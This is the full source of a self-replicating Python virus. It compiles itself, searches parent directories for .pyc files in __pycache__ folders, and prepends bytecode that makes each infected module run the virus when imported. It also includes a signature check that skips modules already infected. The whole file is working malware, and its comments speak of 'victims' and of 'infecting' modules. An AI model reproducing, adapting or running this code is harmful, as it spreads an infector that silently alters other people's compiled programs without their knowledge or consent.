#!/usr/bin/env python3

def main_wrapper():
    # Conventional imports are legal, but pycompile has an unfortunate tendency to optimise these out into the
    # module body. This rather complicates replication, so it's best to just avoid it
    dis, os, marshal, struct, sys, time, random, types, codecs, string, tempfile, py_compile = [
        __import__("dis"), __import__("os"), __import__("marshal"), __import__("struct"), __import__("sys"),
        __import__("time"), __import__("random"), __import__("types"), __import__("codecs"), __import__("string"),
        __import__("tempfile"), __import__("py_compile")]

    class CompiledFile:
        def __init__(self, file):
            self.load(file)
        def load(self, file):
            self.magic = struct.unpack("<H", file.read(2))[0]
            file.read(2)
            if self.magic >= 3390: #3.7
                self.invalidation_mechanism = file.read(4)
            self.invalidation_first = file.read(4) # always datetime 3.6-
            if self.magic >= 3190: #3.3
                self.invalidation_second = file.read(4) # source size 3.6-
            self.module = marshal.load(f)

        def dump(self, file):
            file.write(struct.pack("<H", self.magic))
            file.write(b"\r\n")
            if self.magic >= 3390: #3.7
                file.write(self.invalidation_mechanism)
            file.write(self.invalidation_first)
            if self.magic >= 3190: #3.3
                file.write(self.invalidation_second)
            marshal.dump(self.module, file)

    # Check to see if we've already run, don't continue if so
    if os.environ.get("iridiumscorpion"):
        print("Infector has already been run under this interpreter")
        return
    else:
        os.environ["iridiumscorpion"]="true"

    py_version = "".join([str(a) for a in sys.version_info[:2]])

    # Find our file, compile it if it's not already compiled
    this_path = os.path.abspath(__file__)
    compiled_file_name = this_path
    compiled_file_temp = False
    if this_path.endswith(".pyc"):
        print(this_path)
    else:
        with tempfile.NamedTemporaryFile("r", delete=False) as f:
            compiled_file_name, compiled_file_temp = f.name, True
        py_compile.compile(this_path, compiled_file_name)
        print("{} -> {}".format(this_path, compiled_file_name))

    # Load the compiled file, pull the contents out
    with open(compiled_file_name, "rb") as f:
        this = CompiledFile(f)

    # Leaving suspicious files everywhere is impolite
    if compiled_file_temp:
        os.remove(compiled_file_name)

    # Look for last method in the constant list. It'll always be us!
    for c in list(this.module.co_consts):
        if type(c) == types.CodeType:
            this_method = c

    # Look for potential victims under __pycache__
    for path, dirs, files in os.walk(".."):
        for file in files:
            target_file = os.path.abspath(path + "/" + file)
            if path.endswith("__pycache__") and file.endswith(".pyc") and (file[-6:-4]==py_version or not file[-6].isnumeric()):
                print(target_file)

                if target_file==this_path:
                    print("    Same as source binary")
                    continue

                with open(target_file, "rb") as f:
                    target = CompiledFile(f)

                if target.magic!=this.magic:
                    print("    Target module mismatch ({} v {})".format(target.magic, this.magic))
                    continue
                # Check for LOAD_CONST/LOAD_CONST/MAKE_FUNCTION/CALL_FUNCTION. Let's use it as our signature!
                elif int(py_version)<36 and target.module.co_code[0]==0x64 and target.module.co_code[3]==0x64 and target.module.co_code[6]==0x84 and target.module.co_code[9]==0x83:
                    print("    Module likely already infected")
                    continue
                elif int(py_version)==36 and target.module.co_code[0]==0x64 and target.module.co_code[2]==0x64 and target.module.co_code[4]==0x84 and target.module.co_code[6]==0x83:
                    print("    Module likely already infected")
                    continue
                else:
                    print("    Infecting module (v {})".format(target.magic))

                new_method_name = "".join([random.choice(string.ascii_lowercase) for x in range(255)])

                # Two additions to the constant list: This method, and a randomly generated name
                new_constants = list(target.module.co_consts)
                new_constants.extend([this_method, new_method_name])
                if int(py_version)>35:
                    # LOAD_CONST fn   (00) 64 xx
                    # LOAD_CONST name (02) 64 xx
                    # MAKE_FUNCTION 0 (04) 84 00
                    # CALL_FUNCTION 0 (06) 83 00
                    # POP_TOP         (08) 01 00
                    new_bytecode = struct.pack("=BBBBBBBBBB", 0x64, len(new_constants)-2, 0x64, len(new_constants)-1, 0x84, 0, 0x83, 0, 1, 0)
                else:
                    # LOAD_CONST fn   (00) 64 xxxx
                    # LOAD_CONST name (03) 64 xxxx
                    # MAKE_FUNCTION 0 (06) 84 0000
                    # CALL_FUNCTION 0 (09) 83 0000
                    # POP_TOP         (0C) 01
                    new_bytecode = struct.pack("=BHBHBHBHB", 0x64, len(new_constants)-2, 0x64, len(new_constants)-1, 0x84, 0, 0x83, 0, 1)

                target.module = types.CodeType(
                    target.module.co_argcount,
                    target.module.co_kwonlyargcount,
                    target.module.co_nlocals,
                    target.module.co_stacksize,
                    target.module.co_flags,
                    new_bytecode+target.module.co_code,
                    tuple(new_constants),
                    target.module.co_names,
                    target.module.co_varnames,
                    target.module.co_filename,
                    target.module.co_name,
                    target.module.co_firstlineno,
                    bytes([len(new_bytecode)]) + b"\x00" + target.module.co_lnotab, # No line number change, offset bytecode by length of insertion
                    target.module.co_freevars,
                    target.module.co_cellvars)

                with open(target_file, "wb") as f:
                    target.dump(f)

main_wrapper()
